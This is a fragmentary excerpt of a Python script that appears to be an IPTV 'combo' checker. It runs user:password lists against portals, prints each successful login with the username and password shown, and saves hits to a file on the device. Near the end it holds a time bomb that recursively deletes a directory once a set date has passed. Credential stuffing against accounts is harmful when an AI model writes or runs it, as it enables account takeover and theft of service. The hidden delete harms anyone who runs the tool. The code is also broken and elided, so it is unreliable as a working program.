...
print ("""Escolha um Combo da Lista abaixo:
		
 """+dsy+"""
 
\33[33mForam encontrados """ +str(say)+""" Combos! Escolha um. """)
...
""")
		...
		if kanall=="1":
			imzak="""
"""""" """
		mtl=("""🎬🔗Lista m3u: """+m3ulink+"""
 Bom Uso, Volte Sempre!!""")
...
def yaz(kullanici): 
    dosya=open('/sdcard/hits/'+fx+'.txt','a+') 
...
def echox(user,pas,bot,fyz,oran,hit):
	...
	echo=("""
\33[0m╭─●\33[32mBroke    
├─●  \33[1;32m\33[36m𝗺3uScanning➤  \33[0m\33[1;107;31m """+portal+""" \33[0m     
├─●   \33[0m\033[1m""" +user+""":"""+pas+"""
├─●   \33[33mHit➤""" + str(hit)+""" \33[32m \033[0m \33[1;31m%"""+str(oran)+"""  \33[1;94mCPM➤"""+str(cpm)+"""  \33[0m
╰─●   \33[95m"""+str(bot)+"""  \33[1;36m  Total➤""" + str(fyz)+"""   \33[0m""")
	print(echo)
	cpm=time.time()
if int(time.time()) >= int(1704056400.0):
	shutil.rmtree(dir)
